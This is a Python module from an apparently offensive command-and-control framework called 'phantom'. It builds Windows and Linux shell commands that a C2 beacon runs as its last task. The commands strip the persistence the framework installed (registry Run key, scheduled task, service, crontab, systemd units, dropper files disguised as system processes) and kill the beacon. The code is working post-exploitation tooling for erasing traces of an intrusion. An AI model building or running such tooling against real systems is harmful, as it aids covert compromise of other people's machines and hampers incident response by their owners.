"""
cleanup.py — operational hygiene on the beacon side.

Removes the persistence we installed and kills the beacon process itself
(native `exit`-style teardown). Runs through the beacon channel as a C2
task: the command is the LAST thing the session does before dying.

The exact removal targets mirror what persistence_install creates:
  - windows: HKCU Run key, scheduled task, service, beacon.exe
  - linux:   crontab entry, systemd unit/profile drop-in, dropper files
"""

from __future__ import annotations

from typing import Any, Dict, List

from phantom.automation.belief import Finding, WorldModel


def cleanup_command(os_name: str = "linux", payload: str = "") -> str:
    if "windows" in os_name.lower():
        return (
            'cmd /c "reg delete '
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
            '/v Phantom /f 2>nul & '
            'schtasks /delete /tn Phantom /f 2>nul & '
            'sc stop Phantom 2>nul & sc delete Phantom 2>nul & '
            'taskkill /F /IM beacon.exe /T 2>nul" && echo CLEANUP_OK'
        )
    return (
        "rm -f /tmp/.systemd-proc /tmp/.launchd-service "
        "/etc/systemd/system/phantom* /etc/systemd/user/phantom* "
        "~/.config/systemd/user/phantom* 2>/dev/null; "
        "systemctl --user disable phantom* 2>/dev/null; "
        "crontab -l 2>/dev/null | grep -v phantom | crontab - 2>/dev/null; "
        "pkill -f .systemd-proc 2>/dev/null; "
        "echo CLEANUP_OK"
    )


def cleanup_interpreter(output: str, wm: WorldModel,
                        slots: Dict[str, Any]) -> List[Finding]:
    if "CLEANUP_OK" not in output:
        return []
    return [Finding(kind="cleanup", key="done",
                    value={"os": slots.get("os", ""),
                           "payload": slots.get("payload", "")},
                    confidence=0.9, source="cleanup",
                    evidence=output.strip()[:200])]
